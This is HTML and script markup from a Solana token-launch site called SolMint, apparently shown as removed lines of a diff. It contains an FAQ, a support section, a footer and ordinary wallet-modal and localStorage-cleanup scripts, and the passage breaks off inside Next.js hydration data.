-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:0.2s">⚡</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">How can I create a token on the Solana blockchain?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">Creating a token is simple! Just connect your wallet, fill in the token details like name, symbol, and supply, upload an optional logo, and click &quot;Create Token&quot;. Our platform handles all the technical complexity for you.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0.2s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:0.4s">🔐</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">How can I manage token authorities on Solana?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">Token authorities control who can mint new tokens and freeze accounts. You can choose to enable or disable mint authority and freeze authority when creating your token. These settings provide security and control over your token.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0.30000000000000004s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:0.6000000000000001s">🛟</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">What support resources are available if I encounter issues during my token launch?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">We provide comprehensive support including documentation, live chat support, and a ticket system. You can contact our support team anytime through the floating support button or create a support ticket for detailed assistance.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0.4s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:0.8s">🎯</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">Do I need any programming skills to launch a token on your platform?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">No programming skills required! Our platform is designed to be user-friendly with a visual interface. Simply fill out the form with your token details, and our system handles all the technical blockchain interactions automatically.</p>
-</div>
-</div>
-</div>
-</div>
-
-<div class="relative bg-white/5 backdrop-blur-sm rounded-xl border border-white/10 overflow-hidden hover:border-white/20 transition-all duration-300 hover:shadow-lg hover:shadow-blue-500/10 group transform hover:-translate-y-1" style="animation:fadeInUp 0.6s ease-out 0.5s both">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"></button>
-
-<div class="flex items-center gap-3">
-<div class="relative">
-<div class="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-full blur-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">&nbsp;</div>
-<button class="relative z-10 w-full px-6 py-6 text-left flex items-center justify-between hover:bg-white/5 transition-all duration-300 group"><span class="relative text-xl animate-pulse" style="animation-delay:1s">✅</span></button></div>
-<span class="text-white font-semibold text-lg group-hover:text-blue-200 transition-colors duration-300">How can I confirm that my token launch was successful?</span></div>
-
-<div class="flex-shrink-0">
-<div class="transform transition-transform duration-300 group-hover:scale-110 rotate-0"><svg class="lucide lucide-chevron-down w-5 h-5 transition-colors duration-300 text-gray-400 group-hover:text-blue-300" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="m6 9 6 6 6-6"></path></svg></div>
-</div>
-
-<div class="overflow-hidden transition-all duration-500 ease-out" style="max-height:0px;opacity:0;transform:translateY(-10px)">
-<div class="px-6 pb-6">
-<div class="border-t border-white/10 pt-4">
-<p class="text-gray-300 leading-relaxed">After launch, you will receive a confirmation with your token details and blockchain transaction hash. You can also view your token in the Solana explorer and see it in your wallet. Our platform provides real-time status updates throughout the process.</p>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<!--/$--><!--/$--><!--$--><!--$-->
-
-<section class="py-20 px-4" id="support">
-<div class="container mx-auto max-w-6xl">
-<div class="rounded-2xl p-8 backdrop-blur-sm" style="background-color:hsl(var(--background) / 0.5)">
-<div class="text-center mb-16">
-<h2 class="text-3xl md:text-5xl font-bold mb-6 bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">Need help? We&#39;re here for you!</h2>
-
-<div class="w-24 h-1 bg-gradient-to-r from-blue-500 to-purple-500 mx-auto rounded-full mb-6">&nbsp;</div>
-
-<p class="text-xl text-gray-300 max-w-3xl mx-auto">Our professional support team is ready to assist you 24/7</p>
-
-<p class="text-gray-400 mt-4 max-w-4xl mx-auto">Get expert help with fast response times and personalized solutions for all your needs.</p>
-</div>
-
-<div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
-<div class="group relative bg-white/5 backdrop-blur-sm rounded-2xl p-8 transition-all duration-300 hover:-translate-y-2 hover:shadow-2xl">
-<div class="text-center">
-<div class="w-16 h-16 bg-gradient-to-r from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300 mx-auto"><svg class="lucide lucide-clock w-8 h-8 text-white" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-blue-300 transition-colors">Fast Response</h3>
-
-<p class="text-gray-300 leading-relaxed">Average response time under 2 hours during business days</p>
-</div>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-blue-600/20 to-blue-500/20 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-
-<div class="group relative bg-white/5 backdrop-blur-sm rounded-2xl p-8 transition-all duration-300 hover:-translate-y-2 hover:shadow-2xl">
-<div class="text-center">
-<div class="w-16 h-16 bg-gradient-to-r from-green-500 to-green-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300 mx-auto"><svg class="lucide lucide-circle-check-big w-8 h-8 text-white" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-green-300 transition-colors">Expert Team</h3>
-
-<p class="text-gray-300 leading-relaxed">Experienced professionals with deep knowledge of our platform</p>
-</div>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-green-600/20 to-green-500/20 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-
-<div class="group relative bg-white/5 backdrop-blur-sm rounded-2xl p-8 transition-all duration-300 hover:-translate-y-2 hover:shadow-2xl">
-<div class="text-center">
-<div class="w-16 h-16 bg-gradient-to-r from-purple-500 to-purple-600 rounded-2xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300 mx-auto"><svg class="lucide lucide-heart w-8 h-8 text-white" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path></svg></div>
-
-<h3 class="text-xl font-bold text-white mb-4 group-hover:text-purple-300 transition-colors">Personal Care</h3>
-
-<p class="text-gray-300 leading-relaxed">Individual approach to each ticket and comprehensive solutions</p>
-</div>
-
-<div class="absolute inset-0 rounded-2xl bg-gradient-to-r from-purple-600/20 to-purple-500/20 pointer-events-none -z-10 opacity-0 group-hover:opacity-5 transition-opacity duration-300">&nbsp;</div>
-</div>
-</div>
-
-<div class="text-center"><button class="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white px-8 py-4 rounded-xl font-semibold shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1 inline-flex items-center gap-3"><svg class="lucide lucide-message-circle w-6 h-6" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path></svg>Contact Support</button>
-
-<p class="text-gray-400 text-sm mt-4">Click to go to support chat in your profile</p>
-</div>
-</div>
-</div>
-</section>
-<!--/$--><!--/$--><!--$--><!--$-->
-
-<footer class="bg-gray-900/50 border-t border-white/10 py-12">
-<div class="container mx-auto px-4">
-<div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
-<div>
-<div class="flex items-center space-x-3 mb-4">
-<div class="w-10 h-10 bg-gradient-to-r from-blue-500 to-purple-500 rounded-lg flex items-center justify-center"><span class="text-white font-bold text-lg">🌙</span></div>
-<span class="text-2xl font-bold text-white">SolMint</span></div>
-
-<p class="text-gray-400 mb-6 max-w-md">Create and deploy your Solana tokens effortlessly. Launch your project to the moon!</p>
-</div>
-
-<div class="md:text-right">
-<h3 class="text-white font-semibold mb-4">Quick Links</h3>
-
-<ul class="space-y-2">
-	<li><button class="text-gray-400 hover:text-white transition-colors text-sm w-full md:text-right">Home</button></li>
-	<li><button class="text-gray-400 hover:text-white transition-colors text-sm w-full md:text-right">Create Token</button></li>
-	<li><button class="text-gray-400 hover:text-white transition-colors text-sm w-full md:text-right">Support</button></li>
-	<li><button class="text-gray-400 hover:text-white transition-colors text-sm w-full md:text-right">FAQ</button></li>
-</ul>
-</div>
-</div>
-
-<div class="border-t border-white/10 pt-8">
-<div class="flex flex-col md:flex-row justify-between items-center space-y-4 md:space-y-0">
-<div class="flex items-center space-x-4">
-<p class="text-gray-400 text-sm">&copy; 2024 <!-- -->SolMint<!-- -->. All rights reserved.</p>
-<span class="text-gray-600">&bull;</span>
-
-<p class="text-blue-400 text-sm font-medium">Launch your dreams on Solana blockchain</p>
-</div>
-
-<div class="flex items-center space-x-6">
-<div class="flex items-center space-x-2 text-sm text-gray-400">
-<div class="w-2 h-2 bg-green-500 rounded-full animate-pulse">&nbsp;</div>
-<span>Solana Mainnet</span></div>
-</div>
-</div>
-</div>
-
-<div class="mt-6 p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
-<p class="text-yellow-200 text-sm text-center"><strong>Important:</strong> Always verify contract addresses and do your own research before investing in any token.</p>
-</div>
-</div>
-</footer>
-<!--/$--><!--/$--></main>
-<script>
-              (function() {
-                // Глобальный мониторинг модальных окон кошелька
-                const observeWalletModals = () => {
-                  const observer = new MutationObserver((mutations) => {
-                    mutations.forEach((mutation) => {
-                      mutation.addedNodes.forEach((node) => {
-                        if (node.nodeType === Node.ELEMENT_NODE) {
-                          const element = node;
-                          
-                          // Проверяем если это модальное окно кошелька
-                          if (element.classList?.contains('wallet-adapter-modal-wrapper') ||
-                              element.querySelector?.('.wallet-adapter-modal-wrapper')) {
-                            
-                            const modal = element.classList?.contains('wallet-adapter-modal-wrapper') 
-                              ? element 
-                              : element.querySelector('.wallet-adapter-modal-wrapper');
-                            
-                            if (modal) {
-                              // Принудительное позиционирование
-                              modal.style.cssText = `
-                                position: fixed !important;
-                                top: 0 !important;
-                                left: 0 !important;
-                                right: 0 !important;
-                                bottom: 0 !important;
-                                width: 100vw !important;
-                                height: 100vh !important;
-                                z-index: 10000 !important;
-                                display: flex !important;
-                                align-items: center !important;
-                                justify-content: center !important;
-                                margin: 0 !important;
-                                padding: 16px !important;
-                                backdrop-filter: blur(12px) !important;
-                                background-color: rgba(0, 0, 0, 0.7) !important;
-                                box-sizing: border-box !important;
-                              `;
-                              
-                              // Перенести в body если не там
-                              if (modal.parentElement !== document.body) {
-                                document.body.appendChild(modal);
-                              }
-                              
-                              document.body.classList.add('wallet-modal-open');
-                            }
-                          }
-                        }
-                      });
-                    });
-                  });
-                  
-                  observer.observe(document.body, {
-                    childList: true,
-                    subtree: true
-                  });
-                };
-                
-                // Запуск после загрузки DOM
-                if (document.readyState === 'loading') {
-                  document.addEventListener('DOMContentLoaded', observeWalletModals);
-                } else {
-                  observeWalletModals();
-                }
-              })();
-            </script><script src="/_next/static/chunks/webpack-c664b8afda6f4a57.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"5:\"$Sreact.fragment\"\n8:I[48516,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"default\"]\n9:I[26879,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"default\"]\na:I[53844,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"LogProvider\"]\nb:I[17146,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"AuthProvider\"]\nc:I[49292,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"ThemeProvider\"]\nd:I[58089,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\""])</script><script>self.__next_f.push([1,"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"TranslationProvider\"]\ne:I[68367,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"default\"]\nf:I[4890,[\"8956\",\"static/chunks/3a91511d-9895b53f9f14bd33.js\",\"9995\",\"static/chunks/9995-aac1b4a4991d0545.js\",\"1592\",\"static/chunks/1592-552323d2f4eba5de.js\",\"5731\",\"static/chunks/5731-ca9949a3963a4766.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"7177\",\"static/chunks/app/layout-36b9c31bdf31ce6a.js\"],\"default\"]\n10:I[15244,[],\"\"]\n11:I[43866,[],\"\"]\n13:I[65354,[\"7525\",\"static/chunks/7525-3f03941aa12c5213.js\",\"1853\",\"static/chunks/1853-337f2655932e8c90.js\",\"6269\",\"static/chunks/6269-4f39f8b1c12f4286.js\",\"7146\",\"static/chunks/7146-72604c0bdcde571f.js\",\"5745\",\"static/chunks/5745-e378c4cff8a1fc6f.js\",\"8974\",\"static/chunks/app/page-bf187f8aba4b98b1.js\"],\"default\"]\n14:I[86213,[],\"OutletBoundary\"]\n16:I[86213,[],\"MetadataBoundary\"]\n18:I[86213,[],\"ViewportBoundary\"]\n1a:I[34835,[],\"\"]\n1:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/f0aa736df958819e.css\",\"style\"]\n3:HL[\"/_next/static/css/12cd491ff0fc8e77.css\",\"style\"]\n4:HL[\"/_next/static/css/34a72a2dfc6ca7d9.css\",\"style\"]\n6:T8ed,"])</script><script>self.__next_f.push([1,"\n              (function() {\n                // IMMEDIATELY clean up invalid localStorage values\n                // This runs synchronously before React/WalletProvider initializes\n                try {\n                  const adapterKey = '@solana/wallet-adapter-react';\n                  \n                  // ALWAYS remove the key if it's not valid JSON\n                  // This prevents any JSON parse errors\n                  try {\n                    const value = localStorage.getItem(adapterKey);\n                    if (value) {\n                      const trimmed = value.trim();\n                      \n                      // Check if it's NOT valid JSON structure\n                      // Valid JSON must start with {, [, or be a properly quoted string\n                      const isPlainString = !trimmed.startsWith('{') \u0026\u0026 \n                                           !trimmed.startsWith('[') \u0026\u0026 \n                                           !(trimmed.startsWith('\"') \u0026\u0026 trimmed.endsWith('\"') \u0026\u0026 trimmed.length \u003e 1);\n                      \n                      if (isPlainString) {\n                        // Plain string like \"Phantom\" - remove immediately (silently)\n                        localStorage.removeItem(adapterKey);\n                      } else {\n                        // Try to parse - if fails or is a string, remove it\n                        try {\n                          const parsed = JSON.parse(value);\n                          // Wallet adapter expects an object, not a string\n                          if (typeof parsed === 'string') {\n                            localStorage.removeItem(adapterKey);\n                          }\n                        } catch (parseError) {\n                          localStorage.removeItem(adapterKey);\n                        }\n                      }\n                    }\n                  } catch (readError) {\n                    // If we can't read, try to remove anyway\n                    try {\n                      localStorage.removeItem(adapterKey);\n                    } catch (removeError) {\n                      // Ignore\n                    }\n                  }\n                } catch (e) {\n                  // Ignore all errors silently\n                }\n              })();\n            "])</script><script>self.__next_f.push([1,"7:T53b,\n              (function() {\n                // Clean localStorage IMMEDIATELY when body loads\n                // This is especially important for mobile devices\n                try {\n                  const adapterKey = '@solana/wallet-adapter-react';\n                  const value = localStorage.getItem(adapterKey);\n                  \n                  if (value) {\n                    const trimmed = value.trim();\n                    const isPlainString = !trimmed.startsWith('{') \u0026\u0026 \n                                         !trimmed.startsWith('[') \u0026\u0026 \n                                         !(trimmed.startsWith('\"') \u0026\u0026 trimmed.endsWith('\"') \u0026\u0026 trimmed.length \u003e 1);\n                    \n                    if (isPlainString) {\n                      localStorage.removeItem(adapterKey);\n                    } else {\n                      try {\n                        const parsed = JSON.parse(value);\n                        if (typeof parsed === 'string') {\n                          localStorage.removeItem(adapterKey);\n                        }\n                      } catch (e) {\n                        localStorage.removeItem(adapterKey);\n                      }\n                    }\n                  }\n                } catch (e) {\n                  // Ignore silently\n                }\n              })();\n            12:Td24,"])</script><script>self.__next_f.push([1,"\n              (function() {\n                // Глобальный мониторинг модальных окон кошелька\n                const observeWalletModals = () =\u003e {\n                  const observer = new MutationObserver((mutations) =\u003e {\n                    mutations.forEach((mutation) =\u003e {\n                      mutation.addedNodes.forEach((node) =\u003e {\n                        if (node.nodeType === Node.ELEMENT_NODE) {\n                          const element = node;\n                          \n                          // Проверяем если это модальное окно кошелька\n                          if (element.classList?.contains('wallet-adapter-modal-wrapper') ||\n                              element.querySelector?.('.wallet-adapter-modal-wrapper')) {\n                            \n                            const modal = element.classList?.contains('wallet-adapter-modal-wrapper') \n                              ? element \n                              : element.querySelector('.wallet-adapter-modal-wrapper');\n                            \n                            if (modal) {\n                              // Принудительное позиционирование\n                              modal.style.cssText = `\n                                position: fixed !important;\n                                top: 0 !important;\n                                left: 0 !important;\n                                right: 0 !important;\n                                bottom: 0 !important;\n                                width: 100vw !important;\n                                height: 100vh !important;\n                                z-index: 10000 !important;\n                                display: flex !important;\n                                align-items: center !important;\n                                justify-content: center !important;\n                                margin: 0 !important;\n                                padding: 16px !important;\n                                backdrop-filter: blur(12px) !important;\n                                background-color: rgba(0, 0, 0, 0.7) !important;\n                                box-sizing: border-box !important;\n                              `;\n                              \n                              // Перенести в body если не там\n                              if (modal.parentElement !== document.body) {\n                                document.body.appendChild(modal);\n                              }\n                              \n                              document.body.classList.add('wallet-modal-open');\n                            }\n                          }\n                        }\n                      });\n                    });\n                  });\n                  \n                  observer.observe(document.body, {\n                    childList: true,\n                    subtree: true\n                  });\n                };\n                \n                // Запуск после загрузки DOM\n                if (document.readyState === 'loading') {\n                  document.addEventListener('DOMContentLoaded', observeWalletModals);\n                } else {\n                  observeWalletModals();\n                }\n              })();\n            "])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"mfoC_IoFd6oMPXYnucdHq\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$5\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f0aa736df958819e.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/12cd491ff0fc8e77.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"2\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/34a72a2dfc6ca7d9.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark\",\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"meta\",null,{\"httpEquiv\":\"Cache-Control\",\"content\":\"public, max-age=3600, must-revalidate\"}],[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\"}],[\"$\",\"link\",null,{\"rel\":\"dns-prefetch\",\"href\":\"https://fonts.googleapis.com\"}],[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://fonts.gstatic.com\",\"crossOrigin\":\"anonymous\"}],[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://api.cryptapi.io\",\"crossOrigin\":\"anonymous\"}],[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$6\"}}]]}],[\"$\",\"body\",null,{\"className\":\"__variable_f367f3 font-sans antialiased\",\"children\":[[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$7\"}}],[\"$\",\"$L8\",null,{}],[\"$\",\"$L9\",null,{\"children\":[\"$\",\"$La\",null,{\"children\":[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"$Lc\",null,{\"children\":[\"$\",\"$Ld\",null,{\"children\":[\"$\",\"$Le\",null,{\"children\":[[\"$\",\"$Lf\",null,{}],[\"$\",\"$L10\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L11\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be 